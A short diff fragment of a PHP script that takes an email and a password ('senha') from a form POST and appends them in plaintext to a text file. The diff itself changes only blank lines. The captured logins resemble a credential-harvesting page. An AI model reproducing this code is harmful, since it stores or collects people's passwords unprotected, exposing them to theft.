@@ -241,6 +241,7 @@
 $email =  $_POST['inputEmail'];
 $senha = $_POST['inputSenha'];
 
+
 // Salvando em um txt
 if (isset($email) && $email != "" && isset($senha) && $senha != ""){
 
@@ -249,7 +250,8 @@ if (isset($email) && $email != "" && isset($senha) && $senha != ""){
   fwrite($myfile, $msg."\n");
   fclose($myfile);
 
-
 }
+
+
 
 ?>
